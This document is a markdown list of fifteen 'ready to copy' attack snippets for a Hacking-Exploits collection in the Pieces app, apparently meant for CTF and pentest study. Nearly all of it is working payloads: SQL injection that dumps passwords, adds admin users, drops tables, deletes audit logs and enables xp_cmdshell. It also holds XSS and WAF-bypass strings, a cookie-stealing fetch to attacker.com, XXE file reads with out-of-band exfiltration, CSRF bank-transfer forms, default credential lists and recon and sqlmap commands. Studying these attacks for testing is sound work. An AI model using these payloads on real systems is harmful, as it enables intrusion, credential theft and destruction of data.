# 🔓 PIECES HACKING SNIPPETS — 15 Exploits Ready to Copy

**Copy each snippet below directly into Pieces (Hacking-Exploits collection)**

---

## SQL INJECTION PAYLOADS (5 snippets)

### Snippet 1: SQL Injection - UNION-based (Fast Method)

```
Title: SQL Injection - UNION-based (Fast Method)
Description: 
  Use UNION SELECT to extract data quickly from database.
  Works best when: Output is visible, columns are known.
  Speed: Very fast (direct extraction)
  Detection: Easier to detect (visible in output)
  Example: Extracting usernames and passwords from users table
  
Language: SQL
Collection: Hacking-Exploits
Tags: #sql-injection #payload #tested #union-based
```

**Code to paste:**
```sql
-- Original vulnerable query
SELECT id, username FROM users WHERE id=1

-- UNION injection - extract database name
1' UNION SELECT database(), version()--

-- UNION injection - extract all usernames/passwords
1' UNION SELECT username, password FROM users--

-- UNION injection - extract table names
1' UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_schema=database()--

-- UNION injection - extract specific data
1' UNION SELECT @@version, @@datadir--
```

---

### Snippet 2: SQL Injection - Boolean-based (Blind SQLi)

```
Title: SQL Injection - Boolean-based (Blind SQLi)
Description:
  Detect SQL injection via TRUE/FALSE responses.
  Works best when: Output is not visible, but TRUE/FALSE differs
  Speed: Very slow (binary search required)
  Detection: Harder to detect (no data in output)
  Use case: When output is hidden or database errors are suppressed
  
Language: SQL
Collection: Hacking-Exploits
Tags: #sql-injection #payload #tested #boolean-based
```

**Code to paste:**
```sql
-- Original vulnerable query
SELECT * FROM users WHERE id=1 AND 1=1

-- Boolean injection - True condition
1' AND '1'='1'--    (TRUE response)

-- Boolean injection - False condition
1' AND '1'='2'--    (FALSE response)

-- Boolean injection - Extract first character of database
1' AND SUBSTRING(database(),1,1)='m'--

-- Boolean injection - Extract first character of current user
1' AND SUBSTRING(user(),1,1)='r'--

-- Boolean injection - Check if table exists
1' AND (SELECT COUNT(*) FROM users) > 0--

-- Boolean injection - Check password length
1' AND (SELECT LENGTH(password) FROM users LIMIT 1) > 5--
```

---

### Snippet 3: SQL Injection - Error-based

```
Title: SQL Injection - Error-based
Description:
  Extract data using database error messages.
  Works best when: Error messages are displayed to user
  Speed: Fast (error messages contain data)
  Detection: Easy to detect (error messages visible)
  Use case: When you can see error messages on the page
  
Language: SQL
Collection: Hacking-Exploits
Tags: #sql-injection #payload #tested #error-based
```

**Code to paste:**
```sql
-- Original vulnerable query
SELECT * FROM users WHERE id=1

-- Error-based SQLi - Extract database name
1' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database())))--

-- Error-based SQLi - Extract version
1' OR EXTRACTVALUE(1, CONCAT(0x7e, @@version))--

-- Error-based SQLi - Extract current user
1' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT user())))--

-- Error-based SQLi - Extract table names
1' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables)))--

-- Error-based SQLi - Extract data from users table
1' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(username,':',password) FROM users)))--

-- UpdateXML variant
1' OR UpdateXML(1, CONCAT(0x7e, (SELECT database())), 1)--
```

---

### Snippet 4: SQL Injection - Time-based (Blind detection)

```
Title: SQL Injection - Time-based Blind SQLi
Description:
  Detect SQL injection via deliberate database delays.
  Works best when: No output visible, no error messages
  Speed: Very slow (10+ seconds per character)
  Detection: Very hard to detect (looks like slow server)
  Use case: When both output and errors are hidden
  
Language: SQL
Collection: Hacking-Exploits
Tags: #sql-injection #payload #tested #time-based
```

**Code to paste:**
```sql
-- Original vulnerable query
SELECT * FROM users WHERE id=1

-- Time-based SQLi - MySQL SLEEP()
1' AND SLEEP(5)--           (5 second delay if vulnerable)

-- Time-based SQLi - PostgreSQL pg_sleep()
1' AND pg_sleep(5)--        (5 second delay if vulnerable)

-- Time-based SQLi - MSSQL WAITFOR
1' AND WAITFOR DELAY '00:00:05'--

-- Time-based SQLi - Extract first character of database
1' AND IF(SUBSTRING(database(),1,1)='m', SLEEP(5), 0)--

-- Time-based SQLi - Extract password character by character
1' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a', SLEEP(5), 0)--

-- Time-based SQLi - Check if admin user exists
1' AND IF((SELECT COUNT(*) FROM users WHERE username='admin') > 0, SLEEP(5), 0)--

-- Time-based SQLi - Brute force single character
1' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a', SLEEP(5), 0)--
```

---

### Snippet 5: SQL Injection - Stacked Queries

```
Title: SQL Injection - Stacked Queries
Description:
  Execute multiple SQL statements in one query.
  Works best when: Database allows multiple statements (MySQL sometimes doesn't)
  Speed: Very fast (direct execution)
  Detection: Very easy to detect (data modification visible)
  Risk: HIGH - Can delete/modify data
  Databases: Works on MSSQL, PostgreSQL, Oracle. Limited on MySQL
  
Language: SQL
Collection: Hacking-Exploits
Tags: #sql-injection #payload #tested #stacked-queries #advanced
```

**Code to paste:**
```sql
-- Original vulnerable query
SELECT * FROM users WHERE id=1

-- Stacked queries - Insert new admin user
1; INSERT INTO users (username, password, admin) VALUES ('hacker', 'password123', 1)--

-- Stacked queries - Update existing user to admin
1; UPDATE users SET admin=1 WHERE username='attacker'--

-- Stacked queries - Delete audit logs
1; DELETE FROM audit_logs WHERE user_id=1--

-- Stacked queries - Drop table (DANGEROUS!)
1; DROP TABLE users--

-- Stacked queries - Create new user with MSSQL
1'; CREATE USER hacker WITH PASSWORD 'pass123'; GRANT ADMIN TO hacker--

-- Stacked queries - Disable authentication
1; UPDATE users SET password='' WHERE username='admin'--

-- Stacked queries - Enable xp_cmdshell (MSSQL RCE)
1; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE--
```

---

## XSS PAYLOADS (3 snippets)

### Snippet 6: XSS - Basic Payload

```
Title: XSS - Basic Payload (Reflected/Stored)
Description:
  Basic cross-site scripting payloads for testing input validation.
  Works best when: Input is reflected in response without encoding
  Speed: Immediate (if unfiltered)
  Detection: Depends on WAF/filtering
  Use case: Testing basic XSS vulnerabilities
  
Language: JavaScript
Collection: Hacking-Exploits
Tags: #xss #payload #tested #basic
```

**Code to paste:**
```html
<!-- Basic alert test -->
<script>alert('XSS')</script>

<!-- Image onload event -->
<img src=x onerror=alert('XSS')>

<!-- SVG onload event -->
<svg onload=alert('XSS')>

<!-- Body onload event -->
<body onload=alert('XSS')>

<!-- Input autofocus + onload -->
<input autofocus onfocus=alert('XSS')>

<!-- Iframe with javascript -->
<iframe src="javascript:alert('XSS')"></iframe>

<!-- Form onsubmit -->
<form onsubmit=alert('XSS')><input type=submit></form>

<!-- Style with expression (IE only) -->
<style>body{background:url('javascript:alert("XSS")')}</style>

<!-- Meta refresh with javascript -->
<meta http-equiv="refresh" content="0;url=javascript:alert('XSS')">
```

---

### Snippet 7: XSS - Advanced WAF Bypass

```
Title: XSS - Advanced WAF Bypass Techniques
Description:
  Bypass common WAF filters (script tag blocking, keyword filtering).
  Works best when: Basic payloads are blocked but encoding isn't detected
  Speed: Varies (depends on WAF rules)
  Detection: Hard to detect if well-obfuscated
  Use case: Testing WAF effectiveness
  
Language: JavaScript
Collection: Hacking-Exploits
Tags: #xss #payload #waf-bypass #advanced
```

**Code to paste:**
```html
<!-- Case manipulation -->
<ScRiPt>alert('XSS')</sCrIpT>

<!-- HTML entity encoding -->
&#60;script&#62;alert('XSS')&#60;/script&#62;

<!-- Unicode encoding -->
\u003cscript\u003ealert('XSS')\u003c/script\u003e

<!-- Hex encoding -->
<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))>

<!-- Comment obfuscation -->
<script>eval/*comment*/('alert("XSS")')</script>

<!-- Tag nesting -->
<img src=x onerror="<script>alert('XSS')</script>">

<!-- Mutation XSS (DOM parser quirk) -->
<noscript><p title="</noscript><img src=x onerror=alert('XSS')>

<!-- Data URI -->
<img src="data:text/html,<script>alert('XSS')</script>">

<!-- Event handler with newlines -->
<img src=x onerror="
alert('XSS')
">

<!-- Attribute breaking -->
<input value="x" onclick="alert('XSS')" x="y">
```

---

### Snippet 8: XSS - DOM-based

```
Title: XSS - DOM-based (Client-side)
Description:
  XSS vulnerabilities that exist in client-side JavaScript.
  Works best when: JavaScript uses untrusted input (location.hash, etc.)
  Speed: Immediate (client-side)
  Detection: Hard to detect (server logs don't show it)
  Use case: Testing JavaScript input handling
  
Language: JavaScript
Collection: Hacking-Exploits
Tags: #xss #payload #dom-based #javascript
```

**Code to paste:**
```javascript
// Vulnerable code pattern
// URL: https://example.com/#<img src=x onerror=alert('XSS')>
var data = location.hash.substring(1);
document.getElementById('content').innerHTML = data;  // VULNERABLE!

// Payload variations
#<img src=x onerror=alert(document.cookie)>
#<script>alert('XSS')</script>
#<svg onload=alert('XSS')>
#<img src=x onerror="fetch('http://attacker.com/?cookie='+document.cookie)">

// Safe alternative (use textContent instead of innerHTML)
document.getElementById('content').textContent = data;  // SAFE

// Or encode HTML entities
function htmlEncode(str) {
    return String(str)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#039;');
}
document.getElementById('content').innerHTML = htmlEncode(data);  // SAFE
```

---

## XXE PAYLOADS (2 snippets)

### Snippet 9: XXE - Basic Exploitation

```
Title: XXE - Basic Exploitation (XML External Entity)
Description:
  Read local files via XML entity expansion.
  Works best when: XML parser processes external entities
  Speed: Fast (direct file read)
  Detection: Easy to detect (file content in response)
  Use case: Reading /etc/passwd, config files, etc.
  
Language: XML
Collection: Hacking-Exploits
Tags: #xxe #payload #tested #file-read
```

**Code to paste:**
```xml
<!-- Basic XXE - Read /etc/passwd -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<!-- XXE - Read config file -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/config/database.conf">
]>
<root>&xxe;</root>

<!-- XXE - Read Windows files -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
]>
<root>&xxe;</root>

<!-- XXE - Wrapped in CDATA -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><![CDATA[&xxe;]]></root>

<!-- XXE - With parameter entities -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?data=%file;'>">
  %eval;
]>
<root>&exfiltrate;</root>
```

---

### Snippet 10: XXE - Blind XXE Detection & Out-of-band Exfiltration

```
Title: XXE - Blind XXE & Out-of-band Exfiltration
Description:
  Detect XXE when no output is visible (blind XXE).
  Exfiltrate data via HTTP callbacks to attacker server.
  Works best when: Error messages suppressed, no direct output
  Speed: Varies (depends on callback)
  Detection: Hard to detect (data goes to external server)
  Use case: Reading files when output not visible
  
Language: XML
Collection: Hacking-Exploits
Tags: #xxe #payload #blind-xxe #out-of-band #advanced
```

**Code to paste:**
```xml
<!-- Blind XXE - Time-based detection (DTD error causes delay) -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<root>&send;</root>

<!-- evil.dtd file (host on your server) -->
<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?data=%file;'>">
%all;

<!-- Blind XXE - DNS exfiltration -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<root>&send;</root>

<!-- Blind XXE - HTTP callback (simple) -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % callback SYSTEM "http://attacker.com/log?data=%file;">
]>
<root/>

<!-- Blind XXE - Error-based exfiltration -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/error.dtd">
  %dtd;
]>
<root/>

<!-- error.dtd - triggers error with file content -->
<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?file=%file;'>">
%all;
```

---

## AUTHENTICATION BYPASS (2 snippets)

### Snippet 11: Authentication - SQL Bypass

```
Title: Authentication - SQL Injection Login Bypass
Description:
  Bypass login forms using SQL injection.
  Works best when: Login form uses unsanitized SQL queries
  Speed: Immediate (if successful)
  Detection: Easy to detect in logs
  Use case: Testing authentication security
  
Language: SQL
Collection: Hacking-Exploits
Tags: #auth-bypass #payload #tested #sql-injection
```

**Code to paste:**
```sql
-- Login form SQL pattern
SELECT * FROM users WHERE username='$username' AND password='$password'

-- Classic bypass - Always true condition
Username: admin' --
Password: anything
Result: admin' -- becomes: SELECT * FROM users WHERE username='admin' --' AND password='anything'
The -- comments out the password check!

-- Bypass with OR clause
Username: admin' OR '1'='1
Password: anything
Result: SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='anything'
Returns all users (first one is usually admin)

-- Union-based bypass
Username: admin' UNION SELECT 1,2,3,4 --
Password: anything
Result: Returns injected rows

-- Bypass ignoring password
Username: ' OR 1=1 --
Password: anything
Result: Always true, logs in as first user

-- Case-sensitive bypass variations
Username: aDmIn' --
Username: ADMIN' --
Username: Admin' --
(Try different cases if filter is case-sensitive)

-- Hex encoding bypass
Username: 0x61646d696e' --  (hex for 'admin')
Password: anything

-- Comment variations
Username: admin' #
Username: admin' /*
Username: admin' ;%00
```

---

### Snippet 12: Authentication - Default Credentials

```
Title: Authentication - Default Credentials Exploitation
Description:
  List of common default credentials for applications/devices.
  Works best when: Default credentials were never changed
  Speed: Immediate (if successful)
  Detection: Easy to detect
  Use case: Testing for weak credential management
  
Language: Plain text
Collection: Hacking-Exploits
Tags: #auth-bypass #default-credentials #tested
```

**Code to paste:**
```
COMMON DEFAULT CREDENTIALS

Web Applications:
├─ WordPress: admin / admin
├─ Drupal: admin / admin
├─ Joomla: admin / admin
├─ Magento: admin / 123456
├─ Prestashop: admin / admin
└─ JIRA: admin / admin

Databases:
├─ MySQL: root / (empty)
├─ PostgreSQL: postgres / postgres
├─ MSSQL: sa / sa
├─ Oracle: sys / change_on_install
├─ MongoDB: (no auth by default)
└─ Redis: (no auth by default)

Networking Devices:
├─ Cisco: admin / admin or cisco / cisco
├─ Juniper: root / juniper
├─ Fortinet: admin / (empty)
├─ Ubiquiti: ubnt / ubnt
└─ TP-Link: admin / admin

Cloud Services:
├─ AWS: Check IAM users (no default)
├─ Azure: Service principals
├─ GCP: Service accounts
└─ AWS S3: Public buckets (misconfiguration)

IoT Devices:
├─ Router: admin / admin
├─ Camera: admin / admin or admin / 12345
├─ Printer: admin / admin
├─ Smart TV: admin / admin
└─ IoT devices: Check manufacturer docs

Testing Approach:
1. Check application documentation
2. Search for default credentials online
3. Try common passwords: admin, 123456, password
4. Test for empty passwords
5. Check CIRT/OWASP default credential lists
```

---

## CSRF & OTHER (1 snippet)

### Snippet 13: CSRF - Cross-Site Request Forgery Bypass

```
Title: CSRF - Bypass Token Validation
Description:
  Bypass CSRF token validation in forms.
  Works best when: Token validation is weak or missing
  Speed: Varies (depends on application)
  Detection: Hard to detect (legitimate-looking request)
  Use case: Forcing user actions without their knowledge
  
Language: HTML
Collection: Hacking-Exploits
Tags: #csrf #payload #advanced
```

**Code to paste:**
```html
<!-- CSRF - Victim's browser visits attacker's site with hidden form -->
<html>
<body onload="document.csrf.submit()">
<form name="csrf" action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to_account" value="attacker123">
  <input type="hidden" name="amount" value="10000">
  <input type="hidden" name="csrf_token" value="">  <!-- Empty/stolen token -->
</form>
</body>
</html>

<!-- CSRF - Without CSRF token (if app doesn't validate) -->
<img src="https://admin.example.com/delete?id=123&action=delete">

<!-- CSRF - Using XHR (XMLHttpRequest) -->
<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', 'https://bank.com/transfer', true);
xhr.withCredentials = true;  // Include cookies
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('to_account=attacker&amount=5000');
</script>

<!-- CSRF - Using Fetch API -->
<script>
fetch('https://bank.com/transfer', {
  method: 'POST',
  credentials: 'include',  // Include cookies
  body: new URLSearchParams({
    to_account: 'attacker',
    amount: '5000'
  })
});
</script>

<!-- CSRF - Token bypasses -->
Bypass 1: Token not validated (app bug)
Bypass 2: Token uses predictable values
Bypass 3: Token stored in cookie (can be forged)
Bypass 4: Token only for GET requests
Bypass 5: Token bypass with null value
Bypass 6: Case-sensitive token validation bug
```

---

## RECONNAISSANCE (1 snippet)

### Snippet 14: Reconnaissance - Vulnerability Scanning Commands

```
Title: Reconnaissance - Information Gathering & Scanning
Description:
  Commands for discovering vulnerabilities, open ports, services.
  Works best when: Running against test environments (with permission)
  Speed: Varies (depends on target and network)
  Detection: Easy to detect (generates lots of traffic/logs)
  Use case: Initial reconnaissance phase
  
Language: Bash
Collection: Hacking-Exploits
Tags: #reconnaissance #testing #bash
```

**Code to paste:**
```bash
# Port scanning (nmap)
nmap -sV -sC -p- target.com                    # Full port scan with service version
nmap -sV -sC -p 80,443,22,3306 target.com      # Scan specific ports
nmap -sC --script=http-enum target.com          # HTTP enumeration
nmap --script=smb-enum-shares -p 445 target.com # SMB enumeration

# Web server fingerprinting
curl -I https://target.com                      # Get headers
curl -I -H "User-Agent: Mozilla" https://target.com
wafw00f https://target.com                      # Detect WAF
whatweb https://target.com                      # Web technology detection

# DNS enumeration
nslookup target.com
dig target.com
dig @8.8.8.8 target.com
host target.com
dnsrecon -d target.com                          # DNS brute force

# Subdomain discovery
subfinder -d target.com                         # Subdomain enumeration
assetfinder target.com | sort -u               # Asset discovery
amass enum -d target.com                        # OWASP Amass

# Directory/file enumeration
gobuster dir -u https://target.com -w wordlist.txt
dirb https://target.com /usr/share/dirb/wordlists/common.txt
ffuf -u https://target.com/FUZZ -w wordlist.txt

# SQLi detection
sqlmap -u "https://target.com/page?id=1" --dbs # Detect and enumerate DBs
sqlmap -u "https://target.com/page?id=1" --tables -D dbname

# XSS testing
nikto -h target.com                             # Web vulnerability scanner
```

---

## REFERENCE SNIPPET

### Snippet 15: Learning & Reference - CTF Walkthrough Template

```
Title: CTF Walkthrough Template
Description:
  Template for documenting CTF solutions and learning from them.
  Use this for: HackTheBox, TryHackMe, PortSwigger, PicoCTF
  When complete: Save walkthrough in Pieces with tags
  
Language: Markdown
Collection: Hacking-Exploits
Tags: #reference #template #learning
```

**Code to paste:**
```markdown
# CTF Challenge: [Name]

**Challenge Type:** [SQL Injection / XSS / RCE / etc.]
**Difficulty:** Easy / Medium / Hard
**Source:** [HackTheBox / TryHackMe / PortSwigger / etc.]
**Date Completed:** 2026-02-18

## 🎯 Challenge Description
[What the challenge asked]

## 🔍 Reconnaissance
[What information did you gather?]
- Services running
- Technology stack
- Input validation
- etc.

## 🔓 Exploitation
[How did you exploit it?]
- Step 1: [First step]
- Step 2: [Second step]
- Step 3: [Final step/flag]

## 💡 Key Learnings
- Learned: [What did you learn?]
- Mistake: [What didn't work initially?]
- Next time: [What would you do differently?]

## 🛡️ Defense
[How would you prevent this vulnerability?]
- Input validation
- Parameterized queries
- etc.

## 📚 References
- [Related OWASP topic]
- [Related payloads in Pieces]
- [External resources]

---
**Similar challenges in Pieces:** [Link other snippets]
```

---

## ✅ Copy-Paste Instructions

**For EACH snippet above:**

1. **Open Pieces app**
2. **Click "+" → Create new snippet**
3. **Fill in:**
   - Title: [from snippet header]
   - Description: [from Code section, Description line]
   - Code/Content: [Paste the code]
   - Language: [SQL/JavaScript/XML/Bash/etc.]
   - Collection: **Hacking-Exploits**
   - Tags: [from snippet header, Tags line]
4. **Click Save**
5. **Repeat for next snippet**

**Total time:** ~15 minutes for all 15 snippets

---

*Last updated: 2026-02-18 | Ready to populate: YES ✅*
